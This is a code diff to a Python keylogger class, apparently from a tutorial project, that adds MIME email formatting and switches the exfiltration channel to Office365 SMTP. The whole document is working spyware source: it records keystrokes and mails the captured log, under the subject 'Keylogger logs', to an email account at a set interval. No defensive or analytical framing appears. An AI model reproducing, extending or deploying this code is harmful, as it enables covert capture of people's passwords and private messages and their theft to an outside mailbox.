@@ -3,10 +3,12 @@ import smtplib # for sending email using SMTP protocol (gmail)
 # Timer is to make a method runs after an `interval` amount of time
 from threading import Timer
 from datetime import datetime
+from email.mime.multipart import MIMEMultipart
+from email.mime.text import MIMEText
 
 SEND_REPORT_EVERY = 60 # in seconds, 60 means 1 minute and so on
-EMAIL_ADDRESS = "put_real_address_here@gmail.com"
-EMAIL_PASSWORD = "put_real_pw"
+EMAIL_ADDRESS = "email@provider.tld"
+EMAIL_PASSWORD = "password_here"
 
 class Keylogger:
     def __init__(self, interval, report_method="email"):
@@ -59,17 +61,37 @@ class Keylogger:
             print(self.log, file=f)
         print(f"[+] Saved {self.filename}.txt")
 
-    def sendmail(self, email, password, message):
+    def prepare_mail(self, message):
+        """Utility function to construct a MIMEMultipart from a text
+        It creates an HTML version as well as text version
+        to be sent as an email"""
+        msg = MIMEMultipart("alternative")
+        msg["From"] = EMAIL_ADDRESS
+        msg["To"] = EMAIL_ADDRESS
+        msg["Subject"] = "Keylogger logs"
+        # simple paragraph, feel free to edit
+        html = f"<p>{message}</p>"
+        text_part = MIMEText(message, "plain")
+        html_part = MIMEText(html, "html")
+        msg.attach(text_part)
+        msg.attach(html_part)
+        # after making the mail, convert back as string message
+        return msg.as_string()
+
+    def sendmail(self, email, password, message, verbose=1):
         # manages a connection to an SMTP server
-        server = smtplib.SMTP(host="smtp.gmail.com", port=587)
+        # in our case it's for Microsoft365, Outlook, Hotmail, and live.com
+        server = smtplib.SMTP(host="smtp.office365.com", port=587)
         # connect to the SMTP server as TLS mode ( for security )
         server.starttls()
         # login to the email account
         server.login(email, password)
-        # send the actual message
-        server.sendmail(email, email, message)
+        # send the actual message after preparation
+        server.sendmail(email, email, self.prepare_mail(message))
         # terminates the session
         server.quit()
+        if verbose:
+            print(f"{datetime.now()} - Sent an email to {email} containing:  {message}")
 
     def report(self):
         """
@@ -85,8 +107,8 @@ class Keylogger:
                 self.sendmail(EMAIL_ADDRESS, EMAIL_PASSWORD, self.log)
             elif self.report_method == "file":
                 self.report_to_file()
-            # if you want to print in the console, uncomment below line
-            # print(f"[{self.filename}] - {self.log}")
+                # if you don't want to print in the console, comment below line
+                print(f"[{self.filename}] - {self.log}")
             self.start_dt = datetime.now()
         self.log = ""
         timer = Timer(interval=self.interval, function=self.report)
